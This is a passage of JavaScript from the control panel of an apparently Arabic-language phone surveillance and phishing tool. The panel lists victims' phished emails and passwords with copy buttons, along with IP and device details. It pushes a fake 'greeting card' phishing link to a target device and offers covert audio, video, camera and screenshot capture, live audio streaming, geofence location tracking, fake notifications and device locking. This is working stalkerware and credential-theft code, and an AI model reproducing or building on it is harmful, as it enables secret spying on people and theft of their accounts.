                <div style="color:#888;font-size:11px;margin-bottom:5px;">📧 البريد:</div>
                <div style="color:#fff;font-size:16px;font-weight:bold;direction:ltr;text-align:left;word-break:break-all;">${p.email || '—'}</div>
            </div>
            <div style="background:#0a0005;padding:12px;border-radius:8px;margin-bottom:10px;">
                <div style="color:#888;font-size:11px;margin-bottom:5px;">🔑 كلمة المرور:</div>
                <div style="color:#00ff66;font-size:16px;font-weight:bold;direction:ltr;text-align:left;word-break:break-all;">${p.password || '—'}</div>
                <button onclick="copyToClipboard('${(p.password || '').replace(/'/g, "\\'")}')" style="background:#00cc99;color:#fff;border:none;padding:4px 12px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:11px;margin-top:6px;">📋 نسخ</button>
            </div>
            <div style="color:#888;font-size:11px;line-height:1.8;">
                <div>🖥️ الجهاز: ${p.ua ? p.ua.slice(0, 60) + '...' : '—'}</div>
                <div>📐 الشاشة: ${p.screen || '—'}</div>
                <div>🌍 الدولة: ${p.tz || '—'} — ${p.lang || '—'}</div>
                <div>🌐 IP: ${p.ip || '—'}</div>
                <div>📅 ${formatDate(p.timestamp)}</div>
            </div>
            <button onclick="deletePhishingEntry(${idx})" style="margin-top:10px;background:#ff3300;color:#fff;border:none;padding:6px 15px;border-radius:5px;cursor:pointer;">🗑️ حذف</button>
        `;
        list.appendChild(div);
    });
}

function deletePhishingEntry(idx) {
    if (!confirm('حذف؟')) return;
    authFetch(`/phishing_delete.php?device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
        livePhishing.splice(idx, 1);
        renderLivePhishing();
        updateAdvancedCounters();
    }).catch(() => {
        livePhishing.splice(idx, 1);
        renderLivePhishing();
        updateAdvancedCounters();
    });
}

function copyToClipboard(text) {
    try {
        navigator.clipboard.writeText(text).then(() => {
            showNotification('📋 تم النسخ', text, '📋');
        });
    } catch (e) {}
}

async function sendPhishingCard() {
    if (!currentDevice) { alert('⚠️ اختر جهاز'); return; }

    const ov = document.createElement('div');
    ov.id = 'phishingDialog';
    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;display:flex;align-items:center;justify-content:center;padding:20px;';
    ov.innerHTML = `
        <div style="background:#111;border:2px solid #ff0066;border-radius:15px;padding:25px;max-width:500px;width:100%;">
            <h2 style="color:#ff0066;text-align:center;margin-bottom:20px;">🎣 إرسال بطاقة تهنئة</h2>
            <div style="margin-bottom:15px;">
                <label style="display:block;color:#aaa;margin-bottom:8px;">اسم المُرسِل (اللي هيظهر للضحية)</label>
                <input id="phSender" type="text" value="صديق مقرب" style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #ff0066;border-radius:8px;">
            </div>
            <div style="margin-bottom:15px;">
                <label style="display:block;color:#aaa;margin-bottom:8px;">عنوان البطاقة</label>
                <input id="phTitle" type="text" value="بطاقة تهنئة" style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #ff0066;border-radius:8px;">
            </div>
            <div style="margin-bottom:15px;">
                <label style="display:block;color:#aaa;margin-bottom:8px;">نص البطاقة</label>
                <textarea id="phMsg" rows="3" style="width:100%;padding:12px;background:#0a0a0a;color:#fff;border:1px solid #ff0066;border-radius:8px;resize:vertical;">لقد أرسل لك بطاقة تهنئة خاصة! اضغط حسناً لاستلامها.</textarea>
            </div>
            <div style="display:flex;gap:10px;">
                <button onclick="doSendPhishing()" style="flex:1;background:#ff0066;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;">📤 فتح على الجهاز</button>
                <button onclick="document.getElementById('phishingDialog').remove()" style="background:#333;color:#fff;border:none;padding:12px 20px;border-radius:8px;cursor:pointer;">✖</button>
            </div>
        </div>
    `;
    document.body.appendChild(ov);
}

async function doSendPhishing() {
    const sender = document.getElementById('phSender').value.trim() || 'صديق';
    const title = document.getElementById('phTitle').value.trim() || 'بطاقة تهنئة';
    const msg = document.getElementById('phMsg').value.trim() || '';

    const phishUrl = `https://saeed-ntrq.onrender.com/phishing.html?from=${encodeURIComponent(sender)}&id=${encodeURIComponent(currentDevice)}&title=${encodeURIComponent(title)}&msg=${encodeURIComponent(msg)}`;

    const res = await sendCommandDual('open_url', { url: phishUrl });
    if (res.anyOk) {
        showNotification('🎣 تم الإرسال', 'سيفتح الرابط على الجهاز', '🎣');
        document.getElementById('phishingDialog')?.remove();
    } else alert('❌ فشل');
}

// ═══════════════════════════════════════════
// Advanced menu
// ═══════════════════════════════════════════
function openAdvancedMenu() {
    if (!currentDevice) { alert('⚠️ اختر جهاز أولاً'); return; }
    if (document.getElementById('advancedMenuOverlay')) return;
    const ov = document.createElement('div');
    ov.id = 'advancedMenuOverlay';
    ov.style.cssText = 'position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.95);z-index:10000;overflow-y:auto;padding:20px;';
    ov.innerHTML = `
        <div style="max-width:500px;margin:0 auto;background:#111;border:2px solid #9b59b6;border-radius:15px;padding:25px;">
            <h2 style="color:#9b59b6;text-align:center;margin-bottom:20px;text-shadow:0 0 15px #9b59b6;">⚙️ المميزات المتقدمة</h2>

            <div style="background:#1a0a1a;border:2px solid #00ffcc;border-radius:10px;padding:15px;margin-bottom:15px;">
                <h3 style="color:#00ffcc;margin-bottom:10px;font-size:16px;">🎤 تسجيل صوت</h3>
                <div style="display:flex;gap:8px;">
                    <button id="startAudioBtn" onclick="startAudioRecording()" style="flex:1;background:#00cc66;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;">▶️ بدء التسجيل</button>
                    <button id="stopAudioBtn" onclick="stopAudioRecording()" style="flex:1;background:#ff3300;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;opacity:0.5;" disabled>⏹️ إيقاف</button>
                </div>
                <button onclick="openLiveAudio()" style="width:100%;margin-top:10px;background:#0a3a3a;color:#00ffcc;border:1px solid #00ffcc;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📁 عرض التسجيلات (<span id="liveAudioCount">0</span>)</button>
            </div>

            <div style="background:#0a1a0a;border:2px solid #00ff66;border-radius:10px;padding:15px;margin-bottom:15px;">
                <h3 style="color:#00ff66;margin-bottom:10px;font-size:16px;">🎥 تسجيل فيديو</h3>
                <div style="display:flex;gap:8px;margin-bottom:8px;">
                    <button id="startVideoFrontBtn" onclick="startVideoRecording('front')" style="flex:1;background:#00aa44;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">🤳 أمامي</button>
                    <button id="startVideoBackBtn" onclick="startVideoRecording('back')" style="flex:1;background:#007733;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📷 خلفي</button>
                </div>
                <button id="stopVideoBtn" onclick="stopVideoRecording()" style="width:100%;margin-bottom:10px;background:#ff3300;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;opacity:0.5;" disabled>⏹️ إيقاف + إرسال</button>
                <button onclick="openLiveVideos()" style="width:100%;background:#0a2a0a;color:#00ff66;border:1px solid #00ff66;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📁 عرض الفيديوهات (<span id="liveVideoCount">0</span>)</button>
            </div>

            <div style="background:#1a0a1a;border:2px solid #9b59b6;border-radius:10px;padding:15px;margin-bottom:15px;">
                <h3 style="color:#9b59b6;margin-bottom:10px;font-size:16px;">📸 الكاميرا</h3>
                <div style="display:flex;gap:8px;margin-bottom:10px;">
                    <button onclick="takeCameraPhoto('front')" style="flex:1;background:#9b59b6;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">🤳 أمامية</button>
                    <button onclick="takeCameraPhoto('back')" style="flex:1;background:#6a2c8a;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📷 خلفية</button>
                </div>
                <button onclick="openLiveCamera()" style="width:100%;background:#2a0a3a;color:#9b59b6;border:1px solid #9b59b6;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📁 عرض الصور (<span id="liveCameraCount">0</span>)</button>
            </div>

            <div style="background:#1a0a1a;border:2px solid #ffcc00;border-radius:10px;padding:15px;margin-bottom:15px;">
                <h3 style="color:#ffcc00;margin-bottom:10px;font-size:16px;">📷 لقطة شاشة</h3>
                <button onclick="takeScreenshot()" style="width:100%;background:#ffcc00;color:#000;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;margin-bottom:10px;">📷 التقاط الآن</button>
                <button onclick="openLiveScreenshots()" style="width:100%;background:#3a3a0a;color:#ffcc00;border:1px solid #ffcc00;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📁 عرض اللقطات (<span id="liveScreenshotsCount">0</span>)</button>
            </div>

            <div style="background:#1a0000;border:2px solid #ff0066;border-radius:10px;padding:15px;margin-bottom:15px;">
                <h3 style="color:#ff0066;margin-bottom:10px;font-size:16px;">🔥 مميزات خطيرة</h3>

                <button onclick="sendFakeNotification()" style="width:100%;margin-bottom:8px;background:#ff6600;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;text-align:right;">📢 إرسال إشعار مزيّف</button>

                <button onclick="speakOnDevice()" style="width:100%;margin-bottom:8px;background:#cc00ff;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;text-align:right;">🔊 خلّي الجهاز يتكلم</button>

                <div style="display:flex;gap:8px;margin-bottom:8px;">
                    <button onclick="lockDevice()" style="flex:1;background:#660000;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">🔒 قفل</button>
                    <button onclick="unlockDevice()" style="flex:1;background:#006633;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">🔓 فتح</button>
                </div>

                <button id="motionBtn" onclick="toggleMotionCamera()" style="width:100%;margin-bottom:8px;background:#ff6600;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;text-align:right;">📳 تشغيل مراقبة الحركة</button>
                <button onclick="openLiveMotion()" style="width:100%;margin-bottom:8px;background:#3a1a00;color:#ff8800;border:1px solid #ff8800;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📁 صور الحركة (<span id="liveMotionCount">0</span>)</button>

                <button onclick="openGeofenceDialog()" style="width:100%;margin-bottom:8px;background:#003366;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;text-align:right;">📍 إضافة منطقة Geofence</button>
                <div style="display:flex;gap:8px;margin-bottom:8px;">
                    <button onclick="stopGeofenceMonitor()" style="flex:1;background:#333;color:#fff;border:none;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">⏹️ إيقاف</button>
                    <button onclick="clearAllGeofences()" style="flex:1;background:#660000;color:#fff;border:none;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:12px;">🗑️ مسح</button>
                </div>
                <button onclick="openLiveGeofence()" style="width:100%;margin-bottom:8px;background:#001a33;color:#00aaff;border:1px solid #00aaff;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📁 أحداث الموقع (<span id="liveGeofenceCount">0</span>)</button>

                <button onclick="openDeadManDialog()" style="width:100%;margin-bottom:8px;background:#990000;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;text-align:right;">💀 Dead Man's Switch</button>

                <button id="liveAudioStreamBtn" onclick="toggleLiveAudio()" style="width:100%;background:#00cc99;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;text-align:right;">🎙️ بدء البث الحي</button>
                <button onclick="openLiveAudioStream()" style="width:100%;margin-top:8px;background:#003322;color:#00ff99;border:1px solid #00ff99;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📁 مقاطع البث (<span id="liveLiveAudioCount">0</span>)</button>
            </div>

            <div style="background:#1a0005;border:2px solid #ff0066;border-radius:10px;padding:15px;margin-bottom:15px;">
                <h3 style="color:#ff0066;margin-bottom:10px;font-size:16px;">🎣 التصيّد الإلكتروني</h3>
                <button onclick="sendPhishingCard()" style="width:100%;margin-bottom:8px;background:#ff0066;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:14px;text-align:right;">🎣 إرسال بطاقة تهنئة (Phishing)</button>
                <button onclick="openLivePhishing()" style="width:100%;background:#2a0010;color:#ff0066;border:1px solid #ff0066;padding:10px;border-radius:8px;cursor:pointer;font-weight:bold;font-size:13px;">📁 بيانات الصيد (<span id="livePhishingCount">0</span>)</button>
            </div>

            <button onclick="document.getElementById('advancedMenuOverlay').remove()" style="width:100%;background:#333;color:#fff;border:none;padding:12px;border-radius:8px;cursor:pointer;font-weight:bold;">✖ إغلاق</button>
        </div>
    `;
    document.body.appendChild(ov);
    updateAdvancedCounters();
}

function updateAdvancedCounters() {
    const a = document.getElementById('liveAudioCount'); if (a) a.textContent = liveAudioRecordings.length;
    const c = document.getElementById('liveCameraCount'); if (c) c.textContent = liveCameraPhotos.length;
    const s = document.getElementById('liveScreenshotsCount'); if (s) s.textContent = liveScreenshots.length;
    const v = document.getElementById('liveVideoCount'); if (v) v.textContent = liveVideos.length;
    const m = document.getElementById('liveMotionCount'); if (m) m.textContent = liveMotionPhotos.length;
    const g = document.getElementById('liveGeofenceCount'); if (g) g.textContent = liveGeofenceEvents.length;
    const l = document.getElementById('liveLiveAudioCount'); if (l) l.textContent = liveLiveAudio.length;
    const p = document.getElementById('livePhishingCount'); if (p) p.textContent = livePhishing.length;
}

// ═══════════════════════════════════════════
// Motion photos overlay
// ═══════════════════════════════════════════
function openLiveMotion() {
    const ov = document.getElementById('liveMotionOverlay');
    if (ov) ov.style.display = 'block';
    loadMotionPhotos();
}
function closeLiveMotion() {
    const ov = document.getElementById('liveMotionOverlay');
    if (ov) ov.style.display = 'none';
}
function clearLiveMotion() {
    if (!confirm('مسح كل صور الحركة؟')) return;
    authFetch(`/api.php?action=clear_motion_photos&device=${encodeURIComponent(currentDevice)}`).then(() => {
        liveMotionPhotos = [];
        renderLiveMotion();
        updateAdvancedCounters();
    });
}
function addLiveMotionPhoto(data) {
    liveMotionPhotos.unshift(data);
    if (liveMotionPhotos.length > 500) liveMotionPhotos = liveMotionPhotos.slice(0, 500);
    if (document.getElementById('liveMotionOverlay')?.style.display === 'block') renderLiveMotion();
    updateAdvancedCounters();
}
async function loadMotionPhotos() {
    if (!currentDevice) return;
    try {
        const response = await authFetch(`/api.php?action=get_motion_photos&device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        if (Array.isArray(data)) { liveMotionPhotos = data; renderLiveMotion(); updateAdvancedCounters(); }
    } catch (e) {}
}
function renderLiveMotion() {
    const grid = document.getElementById('liveMotionGrid');
    if (!grid) return;
    if (liveMotionPhotos.length === 0) { grid.innerHTML = '<p style="color:#666;grid-column:1/-1;text-align:center;padding:50px;">لا توجد صور</p>'; return; }
    grid.innerHTML = '';
    liveMotionPhotos.forEach((p, idx) => {
        const card = document.createElement('div');
        card.style.cssText = 'background:#111;padding:10px;border-radius:8px;border:1px solid #ff8800;';
        card.innerHTML = `
            <img src="data:image/jpeg;base64,${p.file_data}" style="width:100%;height:180px;object-fit:cover;border-radius:5px;cursor:pointer;" onclick="window.open(this.src)">
            <div style="color:#ff8800;font-size:11px;margin-top:8px;word-break:break-all;">📳 ${p.file_name || ''}</div>
            <div style="color:#888;font-size:10px;margin-top:3px;">${formatDate(p.timestamp)}</div>
            <div style="display:flex;gap:5px;margin-top:8px;">
                <button onclick="downloadMotionPhoto(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:12px;">⬇️</button>
                <button onclick="deleteMotionPhoto(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:12px;">🗑️</button>
            </div>`;
        grid.appendChild(card);
    });
}
function downloadMotionPhoto(idx) {
    const p = liveMotionPhotos[idx]; if (!p) return;
    const a = document.createElement('a');
    a.href = `data:image/jpeg;base64,${p.file_data}`;
    a.download = p.file_name || 'motion.jpg';
    document.body.appendChild(a); a.click(); a.remove();
}
function deleteMotionPhoto(idx) {
    if (!confirm('حذف؟')) return;
    authFetch(`/api.php?action=delete_motion_photo&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
        liveMotionPhotos.splice(idx, 1); renderLiveMotion(); updateAdvancedCounters();
    });
}

// ═══════════════════════════════════════════
// Geofence events overlay
// ═══════════════════════════════════════════
function openLiveGeofence() {
    const ov = document.getElementById('liveGeofenceOverlay');
    if (ov) ov.style.display = 'block';
    loadGeofenceEvents();
}
function closeLiveGeofence() {
    const ov = document.getElementById('liveGeofenceOverlay');
    if (ov) ov.style.display = 'none';
}
function clearLiveGeofence() {
    if (!confirm('مسح كل الأحداث؟')) return;
    authFetch(`/api.php?action=clear_geofence_events&device=${encodeURIComponent(currentDevice)}`).then(() => {
        liveGeofenceEvents = []; renderLiveGeofence(); updateAdvancedCounters();
    });
}
function addGeofenceEvent(data) {
    liveGeofenceEvents.unshift(data);
    if (liveGeofenceEvents.length > 1000) liveGeofenceEvents = liveGeofenceEvents.slice(0, 1000);
    if (document.getElementById('liveGeofenceOverlay')?.style.display === 'block') renderLiveGeofence();
    updateAdvancedCounters();
}
async function loadGeofenceEvents() {
    if (!currentDevice) return;
    try {
        const response = await authFetch(`/api.php?action=get_geofence_events&device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        if (Array.isArray(data)) { liveGeofenceEvents = data; renderLiveGeofence(); updateAdvancedCounters(); }
    } catch (e) {}
}
function renderLiveGeofence() {
    const list = document.getElementById('liveGeofenceList');
    if (!list) return;
    if (liveGeofenceEvents.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد أحداث</p>'; return; }
    list.innerHTML = '';
    liveGeofenceEvents.forEach((ev, idx) => {
        const isEnter = ev.event === 'enter';
        const color = isEnter ? '#00ff66' : '#ff3300';
        const label = isEnter ? '📥 دخول' : '📤 خروج';
        const div = document.createElement('div');
        div.style.cssText = `background:#001a33;border:2px solid ${color};padding:15px;border-radius:12px;`;
        div.innerHTML = `
            <div style="color:${color};font-size:14px;font-weight:bold;margin-bottom:8px;">${label} — ${ev.zone_name || 'منطقة'}</div>
            <div style="color:#ccc;font-size:13px;margin-bottom:5px;">📅 ${formatDate(ev.timestamp)}</div>
            <div style="color:#888;font-size:12px;">📍 ${(ev.lat || 0).toFixed(4)}, ${(ev.lng || 0).toFixed(4)}</div>
            <div style="color:#888;font-size:12px;">📏 ${Math.round(ev.distance || 0)} م</div>
            <div style="display:flex;gap:8px;margin-top:8px;">
                <a href="https://www.google.com/maps?q=${ev.lat},${ev.lng}" target="_blank" style="flex:1;background:#0099ff;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;text-decoration:none;text-align:center;font-size:12px;">🗺️ خريطة</a>
                <button onclick="deleteGeofenceEvent(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;font-size:12px;">🗑️</button>
            </div>`;
        list.appendChild(div);
    });
}
function deleteGeofenceEvent(idx) {
    if (!confirm('حذف؟')) return;
    authFetch(`/api.php?action=delete_geofence_event&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
        liveGeofenceEvents.splice(idx, 1); renderLiveGeofence(); updateAdvancedCounters();
    });
}

// ═══════════════════════════════════════════
// Live audio chunks overlay
// ═══════════════════════════════════════════
function openLiveAudioStream() {
    const ov = document.getElementById('liveLiveAudioOverlay');
    if (ov) ov.style.display = 'block';
    loadLiveAudio();
}
function closeLiveAudioStream() {
    const ov = document.getElementById('liveLiveAudioOverlay');
    if (ov) ov.style.display = 'none';
}
function clearLiveAudioStream() {
    if (!confirm('مسح كل المقاطع؟')) return;
    authFetch(`/api.php?action=clear_live_audio&device=${encodeURIComponent(currentDevice)}`).then(() => {
        liveLiveAudio = []; renderLiveAudioStream(); updateAdvancedCounters();
    });
}
function addLiveAudioChunk(data) {
    liveLiveAudio.push(data);
    if (liveLiveAudio.length > 200) liveLiveAudio = liveLiveAudio.slice(-200);
    if (document.getElementById('liveLiveAudioOverlay')?.style.display === 'block') renderLiveAudioStream();
    updateAdvancedCounters();
}
async function loadLiveAudio() {
    if (!currentDevice) return;
    try {
        const response = await authFetch(`/api.php?action=get_live_audio&device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        if (Array.isArray(data)) { liveLiveAudio = data; renderLiveAudioStream(); updateAdvancedCounters(); }
    } catch (e) {}
}
function renderLiveAudioStream() {
    const list = document.getElementById('liveLiveAudioList');
    if (!list) return;
    if (liveLiveAudio.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد مقاطع</p>'; return; }
    list.innerHTML = '';
    const sorted = [...liveLiveAudio].sort((a, b) => (a.chunk_index || 0) - (b.chunk_index || 0));
    sorted.forEach((chunk, idx) => {
        const div = document.createElement('div');
        div.style.cssText = 'background:#003322;border:2px solid #00ff99;padding:15px;border-radius:12px;';
        div.innerHTML = `
            <div style="color:#00ff99;font-size:13px;font-weight:bold;margin-bottom:8px;">🎙️ مقطع #${chunk.chunk_index || idx + 1}</div>
            <div style="color:#ccc;font-size:12px;margin-bottom:8px;">📅 ${formatDate(chunk.timestamp)}</div>
            <div style="color:#888;font-size:11px;margin-bottom:8px;">${((chunk.file_size || 0)/1024).toFixed(1)} KB</div>
            <audio controls style="width:100%;margin-bottom:8px;" preload="none">
                <source src="data:audio/mp4;base64,${chunk.file_data}" type="audio/mp4">
            </audio>
            <button onclick="downloadLiveAudioChunk(${idx})" style="width:100%;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">⬇️ تحميل</button>`;
        list.appendChild(div);
    });
}
function downloadLiveAudioChunk(idx) {
    const c = liveLiveAudio[idx]; if (!c) return;
    const a = document.createElement('a');
    a.href = `data:audio/mp4;base64,${c.file_data}`;
    a.download = c.file_name || 'chunk.m4a';
    document.body.appendChild(a); a.click(); a.remove();
}

// ═══════════════════════════════════════════
// Audio overlay
// ═══════════════════════════════════════════
function openLiveAudio() { document.getElementById('liveAudioOverlay').style.display = 'block'; loadAudioRecordings(); }
function closeLiveAudio() { document.getElementById('liveAudioOverlay').style.display = 'none'; }
function clearLiveAudio() {
    if (!confirm('مسح كل التسجيلات؟')) return;
    authFetch(`/api.php?action=clear_audio&device=${encodeURIComponent(currentDevice)}`).then(() => {
        liveAudioRecordings = []; renderLiveAudio(); updateAdvancedCounters();
    });
}
function addLiveAudio(data) {
    liveAudioRecordings.unshift(data);
    if (liveAudioRecordings.length > 200) liveAudioRecordings = liveAudioRecordings.slice(0, 200);
    if (document.getElementById('liveAudioOverlay')?.style.display === 'block') renderLiveAudio();
    updateAdvancedCounters();
}
async function loadAudioRecordings() {
    if (!currentDevice) return;
    try {
        const response = await authFetch(`/api.php?action=get_audio_recordings&device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        if (Array.isArray(data)) { liveAudioRecordings = data; renderLiveAudio(); updateAdvancedCounters(); }
    } catch (e) {}
}
function renderLiveAudio() {
    const list = document.getElementById('liveAudioList');
    if (!list) return;
    if (liveAudioRecordings.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد تسجيلات</p>'; return; }
    list.innerHTML = '';
    liveAudioRecordings.forEach((rec, idx) => {
        const div = document.createElement('div');
        div.style.cssText = 'background:#0a1a1a;border:2px solid #00ffcc;padding:15px;border-radius:12px;';
        div.innerHTML = `
            <div style="color:#00ffcc;font-size:13px;font-weight:bold;margin-bottom:8px;">🎤 تسجيل صوتي</div>
            <div style="color:#ccc;font-size:12px;margin-bottom:8px;">📅 ${formatDate(rec.timestamp)}</div>
            <div style="color:#888;font-size:11px;margin-bottom:8px;">${rec.file_name || ''} (${((rec.file_size||0)/1024).toFixed(1)} KB)</div>
            <audio controls style="width:100%;margin-bottom:8px;" preload="none">
                <source src="data:audio/3gpp;base64,${rec.file_data}" type="audio/3gpp">
                <source src="data:audio/mp4;base64,${rec.file_data}" type="audio/mp4">
            </audio>
            <div style="display:flex;gap:8px;">
                <button onclick="downloadLiveAudio(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">⬇️ تحميل</button>
                <button onclick="deleteLiveAudio(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">🗑️ حذف</button>
            </div>`;
        list.appendChild(div);
    });
}
function downloadLiveAudio(idx) {
    const r = liveAudioRecordings[idx]; if (!r) return;
    const a = document.createElement('a');
    a.href = `data:audio/3gpp;base64,${r.file_data}`;
    a.download = r.file_name || 'audio.3gp';
    document.body.appendChild(a); a.click(); a.remove();
}
function deleteLiveAudio(idx) {
    if (!confirm('حذف؟')) return;
    authFetch(`/api.php?action=delete_audio&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
        liveAudioRecordings.splice(idx, 1); renderLiveAudio(); updateAdvancedCounters();
    });
}

// ═══════════════════════════════════════════
// Video overlay
// ═══════════════════════════════════════════
function openLiveVideos() {
    const ov = document.getElementById('liveVideosOverlay');
    if (ov) ov.style.display = 'block';
    loadVideos();
}
function closeLiveVideos() {
    const ov = document.getElementById('liveVideosOverlay');
    if (ov) ov.style.display = 'none';
}
function clearLiveVideos() {
    if (!confirm('مسح كل الفيديوهات؟')) return;
    authFetch(`/api.php?action=clear_videos&device=${encodeURIComponent(currentDevice)}`).then(() => {
        liveVideos = []; renderLiveVideos(); updateAdvancedCounters();
    });
}
function addLiveVideo(data) {
    liveVideos.unshift(data);
    if (liveVideos.length > 100) liveVideos = liveVideos.slice(0, 100);
    if (document.getElementById('liveVideosOverlay')?.style.display === 'block') renderLiveVideos();
    updateAdvancedCounters();
}
async function loadVideos() {
    if (!currentDevice) return;
    try {
        const response = await authFetch(`/api.php?action=get_videos&device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        if (Array.isArray(data)) { liveVideos = data; renderLiveVideos(); updateAdvancedCounters(); }
    } catch (e) {}
}
function renderLiveVideos() {
    const list = document.getElementById('liveVideosList');
    if (!list) return;
    if (liveVideos.length === 0) { list.innerHTML = '<p style="color:#666;text-align:center;padding:50px;">لا توجد فيديوهات</p>'; return; }
    list.innerHTML = '';
    liveVideos.forEach((vid, idx) => {
        const camLabel = vid.camera_name === 'front' ? '🤳 أمامي' : '📷 خلفي';
        const camColor = vid.camera_name === 'front' ? '#00cc66' : '#00aa44';
        const sizeMB = ((vid.file_size || 0) / 1024 / 1024).toFixed(1);
        const div = document.createElement('div');
        div.style.cssText = `background:#0a1a0a;border:2px solid ${camColor};padding:15px;border-radius:12px;`;
        div.innerHTML = `
            <div style="color:${camColor};font-size:13px;font-weight:bold;margin-bottom:8px;">🎥 فيديو ${camLabel}</div>
            <div style="color:#ccc;font-size:12px;margin-bottom:8px;">📅 ${formatDate(vid.timestamp)}</div>
            <div style="color:#888;font-size:11px;margin-bottom:8px;">${vid.file_name || ''} — ${sizeMB} MB</div>
            <video controls style="width:100%;max-height:300px;margin-bottom:8px;border-radius:8px;background:#000;" preload="metadata">
                <source src="data:video/mp4;base64,${vid.file_data}" type="video/mp4">
            </video>
            <div style="display:flex;gap:8px;">
                <button onclick="downloadLiveVideo(${idx})" style="flex:1;background:#00cc99;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">⬇️ تحميل</button>
                <button onclick="deleteLiveVideo(${idx})" style="flex:1;background:#ff3300;color:#fff;border:none;padding:8px;border-radius:5px;cursor:pointer;font-weight:bold;">🗑️ حذف</button>
            </div>`;
        list.appendChild(div);
    });
}
function downloadLiveVideo(idx) {
    const v = liveVideos[idx]; if (!v) return;
    const a = document.createElement('a');
    a.href = `data:video/mp4;base64,${v.file_data}`;
    a.download = v.file_name || 'video.mp4';
    document.body.appendChild(a); a.click(); a.remove();
}
function deleteLiveVideo(idx) {
    if (!confirm('حذف؟')) return;
    authFetch(`/api.php?action=delete_video&device=${encodeURIComponent(currentDevice)}&index=${idx}`).then(() => {
        liveVideos.splice(idx, 1); renderLiveVideos(); updateAdvancedCounters();
    });
}

// ═══════════════════════════════════════════
// Screenshots
// ═══════════════════════════════════════════
function openLiveScreenshots() { document.getElementById('liveScreenshotsOverlay').style.display = 'block'; loadScreenshots(); }
function closeLiveScreenshots() { document.getElementById('liveScreenshotsOverlay').style.display = 'none'; }
function clearLiveScreenshots() {
    if (!confirm('مسح؟')) return;
    authFetch(`/api.php?action=clear_screenshots&device=${encodeURIComponent(currentDevice)}`).then(() => { liveScreenshots = []; renderLiveScreenshots(); });
}
function addLiveScreenshot(data) {
    liveScreenshots.unshift(data);
    if (liveScreenshots.length > 200) liveScreenshots = liveScreenshots.slice(0, 200);
    if (document.getElementById('liveScreenshotsOverlay')?.style.display === 'block') renderLiveScreenshots();
    updateAdvancedCounters();
}
async function loadScreenshots() {
    if (!currentDevice) return;
    try {
        const response = await authFetch(`/api.php?action=get_screenshots&device=${encodeURIComponent(currentDevice)}`);
        const data = await response.json();
        if (Array.isArray(data)) { liveScreenshots = data; renderLiveScreenshots(); updateAdvancedCounters(); }
    } catch (e) {}
}
function renderLiveScreenshots() {
